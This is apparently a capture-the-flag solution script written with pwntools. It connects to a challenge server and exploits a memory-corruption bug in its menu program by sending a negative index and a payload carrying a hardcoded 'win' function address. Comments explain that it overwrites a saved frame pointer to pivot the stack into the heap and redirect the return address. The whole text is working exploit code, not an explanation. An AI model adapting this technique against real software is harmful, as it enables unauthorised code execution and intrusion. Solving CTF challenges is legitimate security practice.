from pwn import *

#p = process("./chal",env = {'LD_PRELOAD' : './libno_flag_4_u.so'})
p = remote("no-flag-4-u.ctf.maplebacon.org",1337)

win_addr = 0x0000000000401338
addr_slot_start = 0x402004


payload=""


# We will overwrite rbp of the called create_page (gets will only check the saved rbp of get_input)
# so that
# Once popped, we will pivot our stack into a heap location
# We will now be able to easily overwrite the fake saved RIP and return to win

p.sendline(b"1")
p.sendline(b"-2")
p.sendline(b"128")
p.sendline(b"ABCDEFGH" + p64(win_addr))


p.sendline(b"5")


p.interactive()
